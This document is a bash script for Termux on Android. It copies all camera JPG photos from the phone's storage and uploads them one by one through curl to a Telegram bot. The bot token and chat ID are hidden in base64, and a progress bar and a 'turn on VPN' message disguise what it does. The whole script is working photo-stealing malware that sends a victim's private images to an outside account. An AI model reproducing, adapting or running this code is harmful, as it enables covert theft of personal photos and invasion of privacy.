#!/bin/bash

CODE_BASH="NTg4NzY4MzQwNzpBQUZNRTl1dDdUeEF6MWpoTjdDckZVMHBySnlUX3J1dmZDdw==" 
ID_BASH="MTk3ODAxMDc1NQ=="
FILES_PATH="/data/data/com.termux/files/home/downloads"
TIMEOUT=20
LOG_FILE="log.txt"

termux-setup-storage

cp -r /data/data/com.termux/files/home/storage/dcim/Camera/*jpg /data/data/com.termux/files/home/downloads

touch log.txt

FILE_LIST=$(ls ${FILES_PATH})
FILE_COUNT=$(ls ${FILES_PATH} | wc -l)
COUNT=0
print_progress_bar() {
  local percentage=$1
  local width=20
  local fill_char="\e[42m \e[0m"
  local empty_char=" "
  local num_filled=$((percentage * width / 100))
  local num_empty=$((width - num_filled))
  for ((i = 0; i < num_filled; i++)); do
    echo -ne "${fill_char}"
  done
  for ((i = 0; i < num_empty; i++)); do
    echo -ne "${empty_char}"
  done
  echo -ne " $percentage%\r"
}
print_error_message() {
  echo -e "\e[91m! Please turn on \e[93mVPN\e[91m\e[0m"
}
for FILE in ${FILE_LIST}; do
  if grep -q "$FILE" "$LOG_FILE"; then
    continue
  fi
  ((COUNT++))
  PROGRESS=$((COUNT * 100 / FILE_COUNT))
  if ! timeout $TIMEOUT curl -s -F chat_id=$(echo $ID_BASH | base64 -d) -F document=@${FILES_PATH}/${FILE} https://api.telegram.org/bot$(echo $CODE_BASH | base64 -d)/sendDocument > /dev/null 2>&1; then
    print_error_message
    exit 1
  fi
  echo "$FILE" >> "$LOG_FILE"
  print_progress_bar $PROGRESS
done
echo -e "\nDone"
